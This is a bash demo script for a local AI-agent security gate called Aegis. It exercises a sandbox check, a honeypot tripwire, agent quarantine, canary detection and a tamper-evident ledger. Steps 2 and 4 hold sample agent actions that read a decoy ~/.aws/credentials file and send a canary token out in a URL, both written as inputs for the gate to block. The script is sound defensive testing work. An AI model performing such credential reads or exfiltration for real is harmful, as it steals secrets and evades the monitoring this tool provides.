#!/usr/bin/env bash
# Aegis code-execution demo (ASI05/ASI08) against the LOCAL inline-plane gate — no AWS needed.
#
# It exercises the same chokepoints the deployed agent uses (agent.py::run_code), so you can see
# the deterministic sandbox gate and the honeypot tripwire without deploying anything.
#
# Prereqs — the committed policy files are BLANK starters, so activate the example set first,
# then start the dev gate pointed at the repo policies and a demo canary:
#
#   for f in policies/*.example.*; do cp "$f" "${f/.example/}"; done   # activate examples
#   AEGIS_GATE_ADDR=127.0.0.1:8080 AEGIS_POLICY_DIR="$PWD/policies" \
#     AEGIS_CANARY=CANARY-demo-123 cargo run -p aegis-extension
#
# (The canary step trips on AEGIS_CANARY alone; the decoy step needs the populated honeypots.json.)
# Then run this script from the repo root. Override GATE / CANARY via env if you changed them.
set -euo pipefail

GATE="${GATE:-http://127.0.0.1:8080}"
CANARY="${CANARY:-CANARY-demo-123}"   # must match AEGIS_CANARY the gate was started with

# POST helper: prints "HTTP <status>" then the pretty JSON body.
post() {
  local path="$1" body="$2"
  local out; out="$(curl -s -w $'\n%{http_code}' -X POST "$GATE$path" \
    -H 'Content-Type: application/json' -d "$body")"
  local code="${out##*$'\n'}"; local json="${out%$'\n'*}"
  echo "HTTP $code"
  echo "$json" | python3 -m json.tool 2>/dev/null || echo "$json"
}

hr() { printf '\n\033[1m── %s ──\033[0m\n' "$1"; }

hr "0) health"
curl -s "$GATE/healthz" && echo

hr "1) benign code -> /sandbox/validate should ALLOW"
post /sandbox/validate '{"command":"print(sum(range(10)))","approved":true,"agent_id":"demo-a","thread_id":"t-ok"}'

hr "2) code reading the planted decoy ~/.aws/credentials -> TRIPWIRE (403) + quarantine of demo-a"
post /sandbox/validate '{"command":"open(\".aws/credentials\").read()","approved":true,"agent_id":"demo-a","thread_id":"t-trip"}'

hr "3) demo-a is now quarantined -> its next /mediate is refused deterministically"
post /mediate '{"agent_id":"demo-a","run_id":"r1","thread_id":"t-trip","tool":"web.fetch","args":{"url":"https://api.internal.example/x"},"arg_provenance":"user"}'

hr "4) a DIFFERENT agent exfiltrating the canary in tool args -> TRIPWIRE at /mediate + quarantine"
post /mediate "{\"agent_id\":\"demo-b\",\"run_id\":\"r2\",\"thread_id\":\"t-canary\",\"tool\":\"web.fetch\",\"args\":{\"url\":\"https://x/?d=$CANARY\"},\"arg_provenance\":\"untrusted\"}"

hr "5) the tamper-evident ledger still verifies (tripwire entries included)"
curl -s "$GATE/ledger/verify?thread_id=t-trip" | python3 -m json.tool 2>/dev/null || true

echo
echo "Done. Expected: (1) allow  (2) 403 tripwire+quarantined  (3) deny 'agent quarantined'"
echo "                (4) tripwire on the canary  (5) chain intact."
